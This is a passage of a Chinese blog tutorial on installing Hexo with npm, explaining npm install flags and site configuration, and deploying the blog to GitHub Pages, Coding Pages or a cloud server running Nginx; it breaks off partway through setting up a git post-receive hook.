Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>在安装的时候我用的是<code>npm install hexo --save</code></p><h2 id="关于npm命令"><a href="#关于npm命令" class="headerlink" title="关于npm命令"></a>关于npm命令</h2><h3 id="回顾-npm-install-命令"><a href="#回顾-npm-install-命令" class="headerlink" title="回顾 npm install 命令"></a>回顾 npm install 命令</h3><p>最近在写Node程序的时候，突然对 npm install 的-save和-save-dev 这两个参数的使用比较混乱。其实博主在这之前对这两个参数的理解也是模糊的，各种查资料和实践后对它们之间的异同点略有理解。遂写下这篇文章避免自己忘记，同时也给node猿友一点指引。</p><p>我们在使用 npm install 安装模块的模块的时候 ，一般会使用下面这几种命令形式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install moduleName # 安装模块到项目目录下`</span><br><span class="line">npm install -g moduleName # -g 的意思是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置。</span><br><span class="line">npm install -save moduleName # -save 的意思是将模块安装到项目目录下，并在package文件的dependencies节点写入依赖。</span><br><span class="line">npm install -save-dev moduleName # -save-dev 的意思是将模块安装到项目目录下，并在package文件的devDependencies节点写入依赖。</span><br></pre></td></tr></table></figure><p>那么问题来了，在项目中我们应该使用四个命令中的哪个呢？这个就要视情况而定了。下面对这四个命令进行对比，看完后你就不再这么问了。</p><h3 id="npm-install-moduleName-命令"><a href="#npm-install-moduleName-命令" class="headerlink" title="npm install moduleName 命令"></a>npm install moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>不会将模块依赖写入devDependencies或dependencies 节点。</li><li>运行 npm install 初始化项目时不会下载模块。</li></ol><h3 id="npm-install-g-moduleName-命令"><a href="#npm-install-g-moduleName-命令" class="headerlink" title="npm install -g moduleName 命令"></a>npm install -g moduleName 命令</h3><ol><li>安装模块到全局，不会在项目node_modules目录中保存模块包。</li><li>不会将模块依赖写入devDependencies或dependencies 节点。</li><li>运行 npm install 初始化项目时不会下载模块。</li></ol><h3 id="npm-install-save-moduleName-命令"><a href="#npm-install-save-moduleName-命令" class="headerlink" title="npm install -save moduleName 命令"></a>npm install -save moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>会将模块依赖写入dependencies 节点。</li><li>运行 npm install 初始化项目时，会将模块下载到项目目录下。</li><li>运行npm install –production或者注明NODE_ENV变量值为production时，<strong>会</strong>自动下载模块到node_modules目录中。</li></ol><h3 id="npm-install-save-dev-moduleName-命令"><a href="#npm-install-save-dev-moduleName-命令" class="headerlink" title="npm install -save-dev moduleName 命令"></a>npm install -save-dev moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>会将模块依赖写入devDependencies 节点。</li><li>运行 npm install 初始化项目时，会将模块下载到项目目录下。</li><li>运行npm install –production或者注明NODE_ENV变量值为production时，<strong>不会</strong>自动下载模块到node_modules目录中。</li></ol><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><p>&lt;folder&gt; 为hexo安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ cd &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>应用程序的信息。<a href="https://ejs.co/" target="_blank" rel="noopener">EJS</a>, <a href="http://learnboost.github.io/stylus/" target="_blank" rel="noopener">Stylus</a> 和 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a> renderer 已默认安装，您可以自由移除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package.json&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hexo-site&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.0&quot;,</span><br><span class="line">  &quot;private&quot;: true,</span><br><span class="line">  &quot;hexo&quot;: &#123;</span><br><span class="line">    &quot;version&quot;: &quot;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;hexo&quot;: &quot;^3.8.0&quot;,</span><br><span class="line">    &quot;hexo-generator-archive&quot;: &quot;^0.1.5&quot;,</span><br><span class="line">    &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;,</span><br><span class="line">    &quot;hexo-generator-index&quot;: &quot;^0.2.1&quot;,</span><br><span class="line">    &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-ejs&quot;: &quot;^0.3.1&quot;,</span><br><span class="line">    &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;,</span><br><span class="line">    &quot;hexo-renderer-marked&quot;: &quot;^0.3.2&quot;,</span><br><span class="line">    &quot;hexo-server&quot;: &quot;^0.3.3&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p><a href="https://hexo.io/zh-cn/docs/writing" target="_blank" rel="noopener">模版</a> 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p><a href="https://hexo.io/zh-cn/docs/themes" target="_blank" rel="noopener">主题</a> 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>您可以在 <code>_config.yml</code> 中修改大部分的配置。</p><p><iframe src="https://www.youtube.com/embed/A0Enyn70jKU" frameborder="0" allowfullscreen style="box-sizing: inherit; margin: 1em 0px; padding: 0px; border: 0px; outline: 0px; font-weight: inherit; font-style: inherit; font-family: inherit; font-size: 15px; vertical-align: baseline;"></iframe></p><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>title</code></td><td style="text-align:left">网站标题</td></tr><tr><td style="text-align:left"><code>subtitle</code></td><td style="text-align:left">网站副标题</td></tr><tr><td style="text-align:left"><code>description</code></td><td style="text-align:left">网站描述</td></tr><tr><td style="text-align:left"><code>author</code></td><td style="text-align:left">您的名字</td></tr><tr><td style="text-align:left"><code>language</code></td><td style="text-align:left">网站使用的语言</td></tr><tr><td style="text-align:left"><code>timezone</code></td><td style="text-align:left">网站时区。Hexo 默认使用您电脑的时区。<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones" target="_blank" rel="noopener">时区列表</a>。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</td></tr></tbody></table><p>其中，<code>description</code>主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h3 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>url</code></td><td style="text-align:left">网址</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>root</code></td><td style="text-align:left">网站根目录</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>permalink</code></td><td style="text-align:left">文章的 <a href="https://hexo.io/zh-cn/docs/permalinks" target="_blank" rel="noopener">永久链接</a> 格式</td><td style="text-align:left"><code>:year/:month/:day/:title/</code></td></tr><tr><td style="text-align:left"><code>permalink_defaults</code></td><td style="text-align:left">永久链接中各部分的默认值</td></tr></tbody></table><blockquote><p>网站存放在子目录</p><p>如果您的网站存放在子目录中，例如 <code>http://yoursite.com/blog</code>，则请将您的 <code>url</code>设为 <code>http://yoursite.com/blog</code> 并把 <code>root</code> 设为 <code>/blog/</code>。</p></blockquote><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>source_dir</code></td><td style="text-align:left">资源文件夹，这个文件夹用来存放内容。</td><td style="text-align:left"><code>source</code></td></tr><tr><td style="text-align:left"><code>public_dir</code></td><td style="text-align:left">公共文件夹，这个文件夹用于存放生成的站点文件。</td><td style="text-align:left"><code>public</code></td></tr><tr><td style="text-align:left"><code>tag_dir</code></td><td style="text-align:left">标签文件夹</td><td style="text-align:left"><code>tags</code></td></tr><tr><td style="text-align:left"><code>archive_dir</code></td><td style="text-align:left">归档文件夹</td><td style="text-align:left"><code>archives</code></td></tr><tr><td style="text-align:left"><code>category_dir</code></td><td style="text-align:left">分类文件夹</td><td style="text-align:left"><code>categories</code></td></tr><tr><td style="text-align:left"><code>code_dir</code></td><td style="text-align:left">Include code 文件夹</td><td style="text-align:left"><code>downloads/code</code></td></tr><tr><td style="text-align:left"><code>i18n_dir</code></td><td style="text-align:left">国际化（i18n）文件夹</td><td style="text-align:left"><code>:lang</code></td></tr><tr><td style="text-align:left"><code>skip_render</code></td><td style="text-align:left">跳过指定文件的渲染，您可使用 <a href="https://github.com/isaacs/node-glob" target="_blank" rel="noopener">glob 表达式</a>来匹配路径。</td></tr></tbody></table><blockquote><p>提示</p><p>如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。</p></blockquote><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>new_post_name</code></td><td style="text-align:left">新文章的文件名称</td><td style="text-align:left">:title.md</td></tr><tr><td style="text-align:left"><code>default_layout</code></td><td style="text-align:left">预设布局</td><td style="text-align:left">post</td></tr><tr><td style="text-align:left"><code>auto_spacing</code></td><td style="text-align:left">在中文和英文之间加入空格</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>titlecase</code></td><td style="text-align:left">把标题转换为 title case</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>external_link</code></td><td style="text-align:left">在新标签中打开链接</td><td style="text-align:left">true</td></tr><tr><td style="text-align:left"><code>filename_case</code></td><td style="text-align:left">把文件名称转换为 (1) 小写或 (2) 大写</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left"><code>render_drafts</code></td><td style="text-align:left">显示草稿</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>post_asset_folder</code></td><td style="text-align:left">启动 <a href="https://hexo.io/zh-cn/docs/asset-folders" target="_blank" rel="noopener">Asset 文件夹</a></td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>relative_link</code></td><td style="text-align:left">把链接改为与根目录的相对位址</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>future</code></td><td style="text-align:left">显示未来的文章</td><td style="text-align:left">true</td></tr><tr><td style="text-align:left"><code>highlight</code></td><td style="text-align:left">代码块的设置</td></tr></tbody></table><blockquote><p>相对地址</p><p>默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为<code>example.com</code>,您有一篇文章名为<code>hello</code>，那么绝对链接可能像这样：<code>http://example.com/hello.html</code>，它是<strong>绝对</strong>于域名的。相对链接像这样：<code>/hello.html</code>，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p></blockquote><h3 id="分类-amp-标签"><a href="#分类-amp-标签" class="headerlink" title="分类 &amp; 标签"></a>分类 &amp; 标签</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>default_category</code></td><td style="text-align:left">默认分类</td><td style="text-align:left"><code>uncategorized</code></td></tr><tr><td style="text-align:left"><code>category_map</code></td><td style="text-align:left">分类别名</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>tag_map</code></td><td style="text-align:left">标签别名</td></tr></tbody></table><h3 id="日期-时间格式"><a href="#日期-时间格式" class="headerlink" title="日期 / 时间格式"></a>日期 / 时间格式</h3><p>Hexo 使用 <a href="http://momentjs.com/" target="_blank" rel="noopener">Moment.js</a> 来解析和显示时间。</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>date_format</code></td><td style="text-align:left">日期格式</td><td style="text-align:left"><code>YYYY-MM-DD</code></td></tr><tr><td style="text-align:left"><code>time_format</code></td><td style="text-align:left">时间格式</td><td style="text-align:left"><code>H:mm:ss</code></td></tr></tbody></table><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>per_page</code></td><td style="text-align:left">每页显示的文章量 (0 = 关闭分页功能)</td><td style="text-align:left"><code>10</code></td></tr><tr><td style="text-align:left"><code>pagination_dir</code></td><td style="text-align:left">分页目录</td><td style="text-align:left"><code>page</code></td></tr></tbody></table><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>theme</code></td><td style="text-align:left">当前主题名称。值为<code>false</code>时禁用主题</td></tr><tr><td style="text-align:left"><code>deploy</code></td><td style="text-align:left">部署部分的设置</td></tr></tbody></table><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>当执行完<code>npm install</code>之后即可通过<code>hexo s</code>或者<code>hexo serve</code>通过本地访问hexo博客。</p><p>此时博客已搭建在本地了。</p><h5 id="方案一：GithubPages"><a href="#方案一：GithubPages" class="headerlink" title="方案一：GithubPages"></a>方案一：GithubPages</h5><ol><li><p>创建<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com" target="_blank" rel="noopener">Github</a>账号</p></li><li><p>创建仓库， 仓库名为：&lt;Github账号名称&gt;.github.io</p></li><li><p>将本地Hexo博客推送到GithubPages</p><p>3.1. 安装<code>hexo-deployer-git</code>插件。在命令行（即Git Bash）运行以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>3.2. 添加SSH key。</p><ul><li><p>创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure></li><li><p>添加到 github。 复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsettings%2Fkeys" target="_blank" rel="noopener">New SSH Key</a>即可。</p></li><li><p>测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">$ yes</span><br></pre></td></tr></table></figure></li></ul><p>3.3. 修改<code>_config.yml</code>（在站点目录下）。文件末尾修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>注意：上面仓库地址写ssh地址，不写http地址。</p><p>3.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></li><li><p>等待1分钟左右，浏览器访问网址： <code>https://&lt;Github账号名称&gt;.github.io</code></p></li></ol><p>至此，您的Hexo博客已经搭建在GithubPages, 域名为<code>https://&lt;Github账号名称&gt;.github.io</code>。</p><h5 id="方案二：GithubPages-域名"><a href="#方案二：GithubPages-域名" class="headerlink" title="方案二：GithubPages + 域名"></a>方案二：GithubPages + 域名</h5><p>在方案一的基础上，添加自定义域名（您购买的域名）。</p><ol><li><p>域名解析。</p><p>类型选择为 CNAME；</p><p>主机记录即域名前缀，填写为www；</p><p>记录值填写为自定义域名；</p><p>解析线路，TTL 默认即可。</p></li><li><p>仓库设置。</p><p>2.1. 打开博客仓库设置：<code>https://github.com/&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io/settings</code></p><p>2.2. 在Custom domain下，填写自定义域名，点击<code>save</code>。</p><p>2.3. 在站点目录的<code>source</code>文件夹下，创建并打开<code>CNAME.txt</code>，写入你的域名（如<code>www.simon96.online</code>），保存，并重命名为<code>CNAME</code>。</p></li><li><p>等待10分钟左右。</p><p>浏览器访问自定义域名。</p><p>至此，您的Hexo博客已经解析到自定义域名，<code>https://&lt;Github账号名称&gt;.github.io</code>依然可用。</p><p>（可在github仓库中设置跳转至个人域名）</p></li></ol><h6 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a><strong>绑定域名</strong></h6><p>虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a> (知乎排版可能会出现”http://“字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析</p><p><img src="https://pic3.zhimg.com/80/v2-47323ad4490e206aef93a3d68f0670b6_hd.jpg" alt="img"></p><p>然后添加解析</p><p><img src="https://pic3.zhimg.com/80/v2-40222b3a295bb692aac22829a8ec3be2_hd.jpg" alt="img"></p><p>包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 <a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a> 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.<a href="https://link.zhihu.com/?target=http%3A//github.io" target="_blank" rel="noopener">http://github.io</a> 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名</p><p><img src="https://pic4.zhimg.com/80/v2-85ba6dda906f22dea4c03df2b47d994b_hd.jpg" alt="img"></p><p>点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www):</p><p><img src="https://pic1.zhimg.com/80/v2-79abfff91af3f520e24cb91acf6aa994_hd.jpg" alt="img"></p><p>保存，命名为CNAME ，注意保存成<strong>所有文件</strong>而不是<strong>txt文件</strong>。</p><p>完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。</p><h5 id="方案三：GithubPages-CodingPages-域名"><a href="#方案三：GithubPages-CodingPages-域名" class="headerlink" title="方案三：GithubPages + CodingPages + 域名"></a>方案三：GithubPages + CodingPages + 域名</h5><p>GithubPages 在国内较慢，百度不收录，而CodingPages 在国外较快。所以在方案二的基础上，添加CodingPages 。</p><ol><li><p>创建<a href="https://link.juejin.im?target=https%3A%2F%2Fcoding.net%2F" target="_blank" rel="noopener">Coding</a>账号</p></li><li><p>创建仓库， 仓库名为：&lt;Coding账号名称&gt;</p></li><li><p>进入项目里『代码』页面，点击『一键开启静态 Pages』，稍等片刻CodingPages即可部署成功。</p></li><li><p>将本地Hexo博客推送到CodingPages</p><p>4.1. 鉴于创建GithubPages 时，已经生成过公钥。可直接复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>）， 粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fdev.tencent.com%2Fuser%2Faccount%2Fsetting%2Fkeys" target="_blank" rel="noopener">新增公钥</a>。</p><p>4.2. 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@git.coding.net</span><br><span class="line">$ yes</span><br></pre></td></tr></table></figure><p>4.3. 修改<code>_config.yml</code>（在存放Hexo初始化文件的路径下）。文件末尾修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: git@git.dev.tencent.com:&lt;Coding账号名称&gt;/&lt;Coding账号名称&gt;.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></li><li><p>域名解析</p><ol><li><p>添加 CNAME 记录指向 &lt;Coding账号名称&gt;.coding.me</p><p>类型选择为 CNAME；</p><p>主机记录即域名前缀，填写为www；</p><p>记录值填写为自定义域名；</p><p>解析线路，TTL 默认即可。</p></li><li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p><p>类型选择为 A；</p><p>主机记录即域名前缀，填写为@；</p><p>记录值填写为192.30.252.153和192.30.252.154；</p><p>解析线路，境外或谷歌。</p></li><li><p>在『Pages 服务』设置页（<code>https://dev.tencent.com/u/&lt;Coding账号名称&gt;/p/&lt;Coding账号名称&gt;/git/pages/settings</code>）中绑定自定义域名。</p></li></ol></li></ol><p>至此，您的Hexo博客已经解析到自定义域名，<code>https://&lt;Github账号名称&gt;.github.io</code>和<code>https://&lt;Coding账号名称&gt;.coding.me</code>依然可用。</p><h5 id="方案四：云服务器-域名"><a href="#方案四：云服务器-域名" class="headerlink" title="方案四：云服务器 + 域名"></a>方案四：云服务器 + 域名</h5><p>该方案需要先购买云服务器和域名。</p><ol><li><p>在云服务器安装Git 和 Nginx。(Git 用于版本管理和部署，Nginx 用于静态博客托管。)</p><p>登陆root用户，运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y update</span><br><span class="line">$ yum install -y git nginx</span><br></pre></td></tr></table></figure></li><li><p>Nginx配置</p><p>2.1. 创建文件目录(用于博客站点文件存放)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/</span><br><span class="line">mkdir hexo</span><br><span class="line">chmod 775 -R /usr/local/hexo/</span><br></pre></td></tr></table></figure><p>2.2. 添加 index.html(用于检测配置 Nginx 是否成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/hexo/index.html</span><br></pre></td></tr></table></figure><p>添加以下代码，并保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p&gt;Nginx running&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.3. 配置 Nginx 服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>修改server_name和root：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">      listen       80 default_server;</span><br><span class="line">      listen       [::]:80 default_server;</span><br><span class="line">      server_name  www.baidu.com; # 填个人域名      </span><br><span class="line">      root         /usr/local/hexo/;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2.4. 启动nginx服务；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure><p>2.5. 云服务器浏览器访问个人域名或IP，若跳转index.html，则配置完成，否则检查以上配置。</p></li><li><p>git配置</p><p>3.1. 创建文件目录, 用于私人 Git 仓库搭建, 并更改目录读写权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/</span><br><span class="line">mkdir hexoRepo</span><br><span class="line">chmod 775 -R /usr/local/hexoRepo/</span><br></pre></td></tr></table></figure><p>3.2. Git 初始化裸库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd hexoRepo/</span><br><span class="line">git init --bare hexo.git</span><br></pre></td></tr></table></figure><p>3.3. 创建 Git 钩子(hook)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/hexoRepo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>3.4. 输入以下信息，用于指定 Git 的源代码 和 Git 配置文件。</p><figure class="highlight 